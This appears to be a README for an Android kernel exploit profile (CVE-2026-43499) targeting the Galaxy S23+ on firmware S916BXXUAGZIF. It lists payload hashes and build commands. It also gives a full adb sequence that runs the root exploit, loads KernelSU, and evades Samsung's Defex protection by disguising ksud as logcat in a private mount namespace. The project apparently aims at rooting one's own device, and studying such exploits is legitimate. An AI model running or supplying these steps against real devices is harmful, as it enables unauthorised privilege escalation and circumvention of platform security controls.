# Galaxy S23+ SM-S916B (S916BXXUAGZIF) payload

Exact firmware profile for the Galaxy S23+ on firmware `S916BXXUAGZIF`
(`samsung/dm2qxxx/dm2q:17/CP2A.260605.016/S916BXXUAGZIF`), kernel
`5.15.197-android13-8-34343818-abS916BXXUAGZIF`.

## Status

Offline port pending hardware validation — nothing in this profile is
device-tested yet, and there is no hardware evidence to report. Every
constant was re-derived offline from the recovered AGZIF ELF/BTF and
cross-checked by re-deriving the published FZI1 constants first (see
[`../../docs/SM-S916B-S916BXXUAGZIF.md`](../../docs/SM-S916B-S916BXXUAGZIF.md)
for the full drift record). The offline gates already passed:

- **Sepolicy: "no material change".** All 243 brief-scope and 4399
  extended shell/su allow rules are set-equal between the FZI1 and AGZIF
  compiled runtime policies (SETools 4.7.1/libsepol, ODM
  `precompiled_sepolicy` in both builds); the global policy delta of +13
  allows / +1 type proves the comparison non-vacuous.
- **KernelSU loader pair: reuse approved.** The FZG1 pair
  `ksud-dm2q-S916BXXSAFZG1-kdp` passed all three audit gates against the
  recovered AGZIF kernel — 200/200 undefined symbols resolve, all 8
  fail-set BTF types are byte-identical, and the AGZIF kernel itself
  accepts the FZG1 vermagic (the loader never rewrites it; the kernel's
  `check_modinfo` compares only the tail after the release token).

## Files

| File | SHA-256 |
| --- | --- |
| `cve-2026-43499-app.so` | `36bc2c82ebf5bee292af525b09abd19ef620299a26991c36d50f5c70bf401e7f` |
| `cve-2026-43499-root` | `85dff87b6021c2d1bede8335343e74dc39b165182595fbfb8373bec62318e914` |
| `../../kernelsu/ksud-dm2q-S916BXXSAFZG1-kdp` | `5da5818d36da2d589496f91016078a43f50489e5c98b319db4eaa5ee475b86bd` (cross-build reuse, audited against AGZIF, not yet device-tested on it, see above) |

## Build

Built with NDK r30 (30.0.16248370), API 35 — the Homebrew cask r30
layout, with GNU coreutils on `PATH` exactly as when the artifacts were
produced (the Makefile's release/stable rules require GNU `stat -c` and
`truncate`):

```sh
PATH=/opt/homebrew/opt/coreutils/libexec/gnubin:$PATH \
ANDROID_NDK_HOME=/opt/homebrew/Caskroom/android-ndk/30/AndroidNDK16248370.app/Contents/NDK \
  make TARGET=dm2q-S916BXXUAGZIF
```

The published `cve-2026-43499-app.so` (133,432 B) and
`cve-2026-43499-root` (27,536 B) are the natural `make all` sizes for
this target and are byte-reproducible under that toolchain; the app
payload's import set is identical to the FZI1 artifact (84/84 via
`llvm-nm -u`).

## Per-boot usage

Everything is volatile; a reboot removes root and the KernelSU module.
The sequence mirrors the device-tested FZI1/FZH3 flow.

```cmd
adb push cve-2026-43499-app.so /data/local/tmp/dm2q.so
adb push cve-2026-43499-root /data/local/tmp/cve-2026-43499-root
adb push ../../kernelsu/ksud-dm2q-S916BXXSAFZG1-kdp /data/local/tmp/ksud-s25u-kdp
adb shell "chmod 755 /data/local/tmp/cve-2026-43499-root /data/local/tmp/ksud-s25u-kdp"
```

Wait about one minute after a fresh boot, then run one attempt per boot:

```cmd
adb shell "SLIDE_SOURCE=tracefs EXPLOIT_ATTEMPTS=1 P0_ATTEMPT_TIMEOUT_SEC=115 EXPLOIT_ATTEMPT_TIMEOUT_SEC=600 /data/local/tmp/cve-2026-43499-root --run-payload /data/local/tmp/dm2q.so /data/local/tmp/cve-2026-43499-root /data/local/tmp/dm2q-agzif.log"
```

Verify shell root, stage `ksud`, and run the guarded late-load while the
device is still Permissive (the current `su_daemon.c` passes `--ephemeral`,
which this ksud build does not accept, so the guarded invocation is
replicated manually):

```cmd
adb shell "/data/local/tmp/cve-2026-43499-root -c 'id; getenforce'"
adb shell "/data/local/tmp/cve-2026-43499-root -c 'cp /data/local/tmp/ksud-s25u-kdp /data/local/tmp/.ksud-stage; chmod 755 /data/local/tmp/.ksud-stage'"
adb shell "/data/local/tmp/cve-2026-43499-root -c 'unshare -m sh -c \"mount --bind /data/local/tmp/ksud-s25u-kdp /system/bin/logcat && exec logcat late-load --package-name me.weishu.kernelsu\" > /data/local/tmp/ksud-late.log 2>&1'"
adb shell "grep kernelsu /proc/modules"
adb shell "su -c id"
```

On the device-tested FZI1/FZH3 profiles, direct execution of `ksud` from
`/data/local/tmp` is Defex-killed (`Killed`, rc=137); only the
logcat-disguised invocation inside a private mount namespace loads the
module — expect the same on AGZIF. Expect retries on later boots: failed
attempts leave PI state behind and the runner refuses in-boot retries by
design.

## Residual risks (device-run watch list)

- **Not device-tested.** The whole chain, including the carried
  `P0_KERNEL_PHYS_LOAD 0x80080000`, is pending hardware validation. A
  wrong P0 base fails the read-verify gate and aborts cleanly — it never
  blind-writes.
- **futex requeue machinery changed in 5.15.197** (`futex_requeue` and
  `remove_waiter` grew frames and instructions). No profile constant
  binds to either function, and the stale waiter's frame
  (`futex_wait_requeue_pi`) is identical — but a device-run debugger
  should expect different code shape there.
- **New kernel configs**: `CONFIG_SECURITY_SAFESETID=y` and
  `CONFIG_SECURITY_DEFEX_LINK_PROTECTION=y`. Neither gates the module
  load; both are runtime behaviors to watch (su-path credential
  transitions; ksud's `.ksud-stage` staging and bind-mount disguise).
- **Sepolicy comparison is static-analysis-only** (compiled-policy rule
  sets; no kernel-side LSM behavior evidence).
